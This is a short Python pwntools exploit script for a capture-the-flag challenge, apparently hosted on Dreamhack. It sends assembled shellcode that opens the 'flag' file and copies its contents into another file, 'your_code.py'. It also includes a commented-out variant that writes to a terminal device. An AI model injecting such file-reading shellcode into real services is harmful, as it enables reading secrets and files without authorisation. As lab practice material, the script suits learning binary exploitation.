#!/usr/bin/env python3
from pwn import *
import sys

context.log_level = 'info'
context.binary = elf = ELF('./chall', checksec=False)

gs = """
b *main
b *main+504
c
c
si
"""

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
rcu = lambda data: io.recvuntil(data)
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
        #return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path}, gdbscript=gs)
    elif args.REMOTE:
        return remote('host3.dreamhack.games', 9896)
    else:
        return process(elf.path)
        #return process(elf.path, env={"LD_LIBRARY_PATH": libc.path})

payload = \
asm(shellcraft.amd64.open("flag", 0) + shellcraft.amd64.open("your_code.py", 1)  + shellcraft.amd64.read(4, "rsp", 0x64) + shellcraft.amd64.write(5, "rsp", 0x64))

#payload = \
#asm(shellcraft.amd64.open("flag", 0) + shellcraft.amd64.open("/dev/pts/0", 1)  + shellcraft.amd64.read(4, "rsp", 0x64) + shellcraft.amd64.write(5, "rsp", 0x64))

io = start()
sla(b'Say hello to Dobby...if he is Dobby :) ', payload)
io.interactive()